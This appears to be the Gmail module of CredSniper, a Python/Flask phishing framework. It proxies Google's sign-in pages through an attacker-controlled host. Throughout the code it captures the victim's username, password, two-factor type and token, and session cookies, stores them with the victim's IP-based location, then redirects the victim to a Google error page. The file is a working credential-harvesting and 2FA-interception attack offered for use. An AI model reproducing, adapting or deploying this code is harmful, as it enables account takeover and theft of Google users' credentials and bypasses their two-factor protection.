from __future__ import print_function
from flask import redirect, request, jsonify, Markup
from os import system
from core import functions
from core.base_module import *

import re
import sys
import time
import random
import uuid
import requests
import bs4
import json

class GmailModule(BaseModule):
    def __init__(self, enable_2fa=False):
        super().__init__(self)

        self.set_name('gmail')
        self.add_route('main', '/')

        self.add_route('lookup', '/_/signin/sl/lookup')
        self.add_route('signin', '/_/signin/sl/challenge')
        self.add_route('twofactor', '/_/signin/challenge')
        self.add_route('checkcookie', '/CheckCookie')
        self.add_route('selectchallenge', '/_/signin/selectchallenge')

        self.add_route('nothing', '/jserror')
        self.add_route('nothing', '/log')

        self.add_route('sleep_and_redirect', '/signin/v2/challenge/password/empty')

        self.enable_two_factor(enable_2fa)

        self.twofactor_time = 0

    def proxy_request(self, req):
        headers = {}
        for header in req.headers:
            headers[header[0]] = header[1].replace(req.host, 'accounts.google.com')

        cookies = {}
        for cookie in self.cookies:
            cookies[cookie] = self.cookies[cookie]

        values = {}
        for param in req.values.items():
            values[param[0]] = param[1].replace(req.host, 'accounts.google.com')

        server_response = requests.post('{}{}?{}'.format('https://accounts.google.com',req.path, req.query_string),
                                        data=values,
                                        headers=headers,
                                        cookies=cookies)

        page_content = server_response.text.replace('accounts.google.com', request.host)
        page_content = page_content.replace('play.google.com', request.host)
        page_content = page_content.replace('accounts.youtube.com', request.host)
        return page_content

    def main(self):
        next_url = '/accounts'

        headers = {}
        for header in request.headers:
            headers[header[0]] = header[1].replace(request.host, 'accounts.google.com')

        session = requests.Session()
        server_response = session.get('https://accounts.google.com?hl=en', headers=headers)

        page_content = server_response.text.replace('accounts.google.com', request.host)
        page_content = page_content.replace('play.google.com', request.host)
        page_content = page_content.replace('accounts.youtube.com', request.host)

        # We dont want to handle Captchas and TOS. Lets leave that to Google
        page_content = page_content.replace('/Captcha?', 'https://accounts.google.com/Captcha?')
        page_content = page_content.replace('{}/TOS?'.format(request.host), 'accounts.google.com/TOS?')

        self.cookies = session.cookies.get_dict()

        return page_content

    def nothing(self):
        return '[]'

    def sleep_and_redirect(self):
        time.sleep(10000)
        return redirect('https://accounts.google.com/404', code=302)

    def checkcookie(self):
        city, region, zip_code = '','',''
        try:
            geoip_url = 'https://freegeoip.net/json/{}'.format(
                request.remote_addr
            )
            geo_session = requests.Session()
            geo_response = geo_session.get(geoip_url)
            geo = json.loads(geo_response.text)
            city = geo['city']
            region = geo['region_name']
            zip_code = geo['zip_code']
        except Exception as ex:
            pass

        functions.store_creds(
            self.name,
            self.user,
            self.password,
            self.two_factor_token,
            self.two_factor_type,
            request.remote_addr,
            city,
            region,
            zip_code,
            self.twofactor_time,
            self.cookies
        )

        return redirect("https://accounts.google.com/404", code=302)

    def lookup(self):
        self.user = json.loads(request.values.get('f.req'))[0]

        signin_response = self.proxy_request(request)
        return signin_response.replace('[["gf.alr"', '[[["gf.alr"').replace(',["gf.ttu",1]', ',["gf.ttu",1]\n,["e",3,null,null,1620]\n]')

    def signin(self):
        self.password = json.loads(request.values.get('f.req'))[4][4][0]

        functions.cache_creds(
            self.name,
            self.user,
            self.password
        )

        signin_response = self.proxy_request(request).replace('[["gf.sicr"', '[[["gf.sicr"')

        if "INCORRECT_ANSWER_ENTERED" in signin_response:
            signin_response = '{}\n,["e",2,null,null,364]\n]]'.format(signin_response[0:len(signin_response)-1])
        else:
            if "TWO_STEP_VERIFICATION" in signin_response:
                sms = signin_response.find('{"1009":[')
                authenticator = signin_response.find('{"1006":[')
                backup_codes = signin_response.find('{"1008":[')

                if sms != -1 and (sms < authenticator and sms < backup_codes):
                    self.two_factor_type = "sms"
                elif authenticator != -1 and (authenticator < sms and authenticator < backup_codes):
                    self.two_factor_type = "authenticator"
                elif backup_codes != -1 and (backup_codes < authenticator and backup_codes < sms):
                    self.two_factor_type = "backup_codes"
                else:
                    self.two_factor_type = "invite_or_security_key"

            signin_response = '{},["e",3,null,null,871]\n]]'.format(signin_response[0:len(signin_response)-1])

        return signin_response

    def twofactor(self):
        try:
            self.two_factor_token = json.loads(request.values.get('f.req'))[4][5][0]
            self.twofactor_time = int(time.time())
        except Exception as ex:
            pass

        signin_response = self.proxy_request(request).replace('[["gf.sicr"', '[[["gf.sicr"')
        return '{},["e",3,null,null,871]\n]]'.format(signin_response[0:len(signin_response)-1])

    def selectchallenge(self):
        signin_response = self.proxy_request(request).replace('[["gf.siscr"', '[[["gf.siscr"')
        return '{},["e",3,null,null,871]\n]]'.format(signin_response[0:len(signin_response)-1])

# REQUIRED: When module is loaded, credsniper calls load()
def load(enable_2fa=False):
    '''Initial load() function called from importlib in the main CredSniper functionality.'''
    return GmailModule(enable_2fa)

